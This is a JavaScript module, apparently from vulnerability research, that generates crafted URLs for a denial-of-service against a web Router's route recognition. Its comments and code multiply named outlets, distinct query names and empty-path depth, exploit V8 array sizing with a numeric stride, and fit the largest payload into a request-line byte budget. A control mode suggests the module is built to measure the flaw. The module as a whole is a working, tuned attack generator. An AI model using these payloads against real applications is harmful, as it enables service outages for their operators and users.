// One request URL, two attacker-chosen dimensions, and a route depth the
// application already has:
//
//   auxiliary outlets  x  distinct query names  x  empty-path depth
//
// Recognition walks every outlet the URL declares, an empty-path route matches
// each of them without consuming a segment, and every snapshot it builds copies
// the whole query map. The URL pays for the outlets and the names once each;
// the Router pays for their product.
const ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

// Shortest distinct ASCII spellings: 52 one-letter, then two, then three.
function keyAt(index) {
  const n = ALPHABET.length;
  if (index < n) return ALPHABET[index];
  let rest = index - n;
  if (rest < n * n) return ALPHABET[(rest / n) | 0] + ALPHABET[rest % n];
  rest -= n * n;
  return (
    ALPHABET[(rest / (n * n)) | 0] + ALPHABET[((rest / n) | 0) % n] + ALPHABET[rest % n]
  );
}

// Alphabetic names land in a NameDictionary. Numeric ones are array indices, so
// they land in V8 elements instead, and a dense elements store is sized to the
// LARGEST index with the empty slots included. A stride between names therefore
// buys sparsity, and sparsity is what costs.
//
// Two things bound it. Past some sparsity V8 gives up on the dense store and
// converts to dictionary elements, where the advantage vanishes. And the stride
// is paid for in bytes, because bigger numbers are more digits, so a fixed
// request line fits fewer of them. Contiguous numbering is the wrong move: a
// dense array of N slots is cheaper than a dictionary holding N entries, so
// "?0&1&2" costs less than alphabetic names, not more.
function nameAt(index, mode, stride) {
  return mode === "numeric" ? String(index * stride) : keyAt(index);
}

// "name:/()" is a named outlet holding an empty primary child group. The terser
// "name:" does not work: the parser folds the outlets into one group and the
// fan-out disappears.
function outlets(count) {
  return Array.from(
    { length: count },
    (_, index) => `${index ? "//" : ""}${keyAt(index)}:/()`,
  ).join("");
}

// The control keeps every byte, every outlet and every query pair, and changes
// only how many distinct names the query map ends up with: every name becomes a
// run of "a" of its own length, so "b" becomes "a" and "cd" becomes "aa". Same
// bytes, same pair count, one distinct name per length. The Router parses the
// same pairs and retains the same values either way.
export function buildTarget({
  shape,
  mode,
  outletCount,
  queryNames,
  nameMode = "alpha",
  stride = 9,
}) {
  const names = Array.from({ length: queryNames }, (_, index) =>
    nameAt(index, nameMode, stride),
  );
  const query =
    mode === "control" ? names.map((name) => "a".repeat(name.length)) : names;

  return `/${shape}/(${outlets(outletCount)})?${query.join("&")}`;
}

// The attacker is constrained by the request line, not by the name count, so
// comparing two name encodings is only fair at equal bytes. Given the outlets
// and a byte budget, this is the widest query that still fits.
export function fitQueryNames({ shape, outletCount, nameMode, stride, budget }) {
  const size = (count) =>
    Buffer.byteLength(
      buildTarget({ shape, mode: "candidate", outletCount, queryNames: count, nameMode, stride }),
    );

  if (size(0) > budget) return 0;

  let low = 0;
  let high = 20000;
  while (low < high) {
    const middle = (low + high + 1) >> 1;
    if (size(middle) <= budget) low = middle;
    else high = middle - 1;
  }
  return low;
}
